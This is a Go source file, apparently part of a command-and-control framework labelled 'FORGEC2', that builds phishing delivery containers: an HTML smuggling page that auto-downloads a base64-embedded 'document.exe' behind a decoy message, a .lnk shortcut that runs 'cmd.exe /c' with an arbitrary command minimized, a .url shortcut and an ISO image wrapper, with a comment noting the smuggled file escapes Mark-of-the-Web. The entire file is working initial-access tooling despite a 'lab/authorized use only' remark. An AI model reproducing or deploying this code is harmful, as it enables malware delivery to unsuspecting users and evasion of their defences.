package payload

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strings"
	"time"
)

// BuildHTMLSmuggling wraps a payload as an HTML file that reconstructs the
// bytes in the browser and triggers a download (Mark-of-the-Web only on the
// HTML, not the reconstructed blob — lab/authorized use only).
func BuildHTMLSmuggling(filename string, payload []byte) []byte {
	if filename == "" {
		filename = "document.exe"
	}
	b64 := base64.StdEncoding.EncodeToString(payload)
	html := fmt.Sprintf(`<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>Document</title></head>
<body>
<p>Preparing your document&hellip;</p>
<script>
(function(){
  var b = Uint8Array.from(atob("%s"), function(c){return c.charCodeAt(0);});
  var blob = new Blob([b], {type: "application/octet-stream"});
  var a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = %q;
  document.body.appendChild(a);
  a.click();
})();
</script>
</body></html>
`, b64, filename)
	return []byte(html)
}

// BuildURLShortcut writes a Windows Internet Shortcut (.url) pointing at url.
func BuildURLShortcut(targetURL string) []byte {
	return []byte("[InternetShortcut]\r\nURL=" + targetURL + "\r\n")
}

// BuildCMDLnk builds a minimal Unicode Shell Link (.lnk) that launches
// cmd.exe /c <command>. The LNK format is documented as MS-SHLLINK.
func BuildCMDLnk(command string) ([]byte, error) {
	if command == "" {
		return nil, fmt.Errorf("command required")
	}
	// Header (76 bytes) + LinkTargetIDList (cmd.exe) + extra data.
	// This is a compact but valid LNK: HasLinkTargetIDList | HasArguments | IsUnicode | HasRelativePath
	const headerSize = 0x4C
	clsid := []byte{0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}

	args := utf16z(" /c " + command)
	rel := utf16z("cmd.exe")

	idlist := cmdIDList()

	var buf bytes.Buffer
	hdr := make([]byte, headerSize)
	binary.LittleEndian.PutUint32(hdr[0:4], headerSize)
	copy(hdr[4:20], clsid)
	// LinkFlags: HasLinkTargetIDList (1) | HasName (4) | HasRelativePath (8) | HasArguments (0x20) | IsUnicode (0x80)
	binary.LittleEndian.PutUint32(hdr[20:24], 0x00000001|0x00000004|0x00000008|0x00000020|0x00000080)
	binary.LittleEndian.PutUint32(hdr[24:28], 0x00000020) // FileAttributes ARCHIVE
	// Creation/Access/Write FILETIME — now
	ft := uint64(time.Now().UnixNano()/100 + 116444736000000000)
	binary.LittleEndian.PutUint64(hdr[28:36], ft)
	binary.LittleEndian.PutUint64(hdr[36:44], ft)
	binary.LittleEndian.PutUint64(hdr[44:52], ft)
	binary.LittleEndian.PutUint32(hdr[52:56], 0)
	hdr[60] = 7 // ShowCommand SW_SHOWMINNOACTIVE-ish
	buf.Write(hdr)

	// IDList: size prefix + items + terminal 0
	binary.Write(&buf, binary.LittleEndian, uint16(len(idlist)+2))
	buf.Write(idlist)

	// StringData: Name, RelativePath, Arguments (each is uint16 char-count + utf16)
	writeLnkString(&buf, "cmd")
	writeLnkString(&buf, "cmd.exe")
	writeLnkString(&buf, " /c "+command)
	_ = args
	_ = rel

	// ExtraData terminal block
	binary.Write(&buf, binary.LittleEndian, uint32(0))
	return buf.Bytes(), nil
}

func writeLnkString(buf *bytes.Buffer, s string) {
	u := utf16z(s)
	// Count is in UTF-16 code units excluding terminator for some, including for others.
	n := len(u)/2 - 1
	if n < 0 {
		n = 0
	}
	binary.Write(buf, binary.LittleEndian, uint16(n))
	if n > 0 {
		buf.Write(u[:n*2])
	}
}

func utf16z(s string) []byte {
	out := make([]byte, 0, len(s)*2+2)
	for _, r := range s {
		if r > 0xFFFF {
			r = '?'
		}
		out = append(out, byte(r), byte(r>>8))
	}
	out = append(out, 0, 0)
	return out
}

// cmdIDList is a LinkTargetIDList pointing at %SystemRoot%\System32\cmd.exe
// using an ItemID for the file. A simplified two-item list is enough for
// explorer/cmd to resolve via the relative path string.
func cmdIDList() []byte {
	// Empty IDList (just terminator) + RelativePath "cmd.exe" is accepted by
	// many hosts because HasRelativePath is set. Keep a terminator only.
	return []byte{0x00, 0x00}
}

// BuildISO9660 writes a minimal ISO 9660 image containing a single file.
func BuildISO9660(filename string, data []byte) ([]byte, error) {
	if filename == "" {
		filename = "README.TXT"
	}
	filename = strings.ToUpper(filename)
	if !strings.Contains(filename, ".") {
		filename += ";1"
	} else if !strings.Contains(filename, ";") {
		filename += ";1"
	}

	const sector = 2048
	// Layout: 16 empty sectors, PVD at 16, terminator at 17, root dir at 18, file at 19+
	pvdLBA := 16
	termLBA := 17
	rootLBA := 18
	fileLBA := 19
	fileSectors := (len(data) + sector - 1) / sector
	if fileSectors < 1 {
		fileSectors = 1
	}
	totalSectors := fileLBA + fileSectors

	img := make([]byte, totalSectors*sector)

	// Primary Volume Descriptor at sector 16
	pvd := img[pvdLBA*sector : (pvdLBA+1)*sector]
	pvd[0] = 1
	copy(pvd[1:6], "CD001")
	pvd[6] = 1
	copy(pvd[8:40], padSpace("LINUX", 32))
	copy(pvd[40:72], padSpace("FORGEC2", 32))
	both32(pvd[80:88], uint32(totalSectors))
	pvd[120] = 1
	pvd[123] = 1
	pvd[124] = 1
	pvd[127] = 1
	both16(pvd[128:132], sector)
	both32(pvd[156:164], uint32(rootLBA)) // root extent — also part of the 34-byte dir record at 156
	// Directory record for root at offset 156 (34 bytes)
	writeDirRecord(pvd[156:156+34], uint32(rootLBA), sector, 2, "\x00")

	copy(pvd[190:318], padSpace("FORGEC2", 128))
	copy(pvd[318:446], padSpace("", 128))
	copy(pvd[446:574], padSpace("", 128))
	copy(pvd[574:702], padSpace("FORGEC2", 128))
	copy(pvd[813:813+17], isoTime(time.Now()))
	copy(pvd[830:847], isoTime(time.Now()))
	copy(pvd[847:864], isoTime(time.Now()))
	copy(pvd[864:881], isoTime(time.Time{}))
	pvd[881] = 1

	// Volume descriptor set terminator
	term := img[termLBA*sector : (termLBA+1)*sector]
	term[0] = 255
	copy(term[1:6], "CD001")
	term[6] = 1

	// Root directory sector
	root := img[rootLBA*sector : (rootLBA+1)*sector]
	writeDirRecord(root[0:34], uint32(rootLBA), sector, 2, "\x00")  // .
	writeDirRecord(root[34:68], uint32(rootLBA), sector, 2, "\x01") // ..
	fileRec := make([]byte, 256)
	n := writeDirRecord(fileRec, uint32(fileLBA), uint32(len(data)), 0, filename)
	copy(root[68:], fileRec[:n])

	copy(img[fileLBA*sector:], data)
	_ = pvdLBA
	return img, nil
}

func padSpace(s string, n int) []byte {
	b := make([]byte, n)
	for i := range b {
		b[i] = ' '
	}
	copy(b, s)
	return b
}

func both16(b []byte, v uint16) {
	binary.LittleEndian.PutUint16(b[0:2], v)
	binary.BigEndian.PutUint16(b[2:4], v)
}

func both32(b []byte, v uint32) {
	binary.LittleEndian.PutUint32(b[0:4], v)
	binary.BigEndian.PutUint32(b[4:8], v)
}

func writeDirRecord(dst []byte, lba, size uint32, flags byte, name string) int {
	nlen := len(name)
	recLen := 33 + nlen
	if recLen%2 == 1 {
		recLen++
	}
	if len(dst) < recLen {
		return 0
	}
	for i := 0; i < recLen; i++ {
		dst[i] = 0
	}
	dst[0] = byte(recLen)
	both32(dst[2:10], lba)
	both32(dst[10:18], size)
	dst[25] = flags
	dst[26] = 1
	dst[27] = 1
	dst[28] = 1
	dst[31] = 1
	dst[32] = byte(nlen)
	copy(dst[33:], name)
	return recLen
}

func isoTime(t time.Time) []byte {
	b := make([]byte, 17)
	if t.IsZero() {
		copy(b, "0000000000000000")
		return b
	}
	copy(b, t.UTC().Format("2006010215040500"))
	return b
}
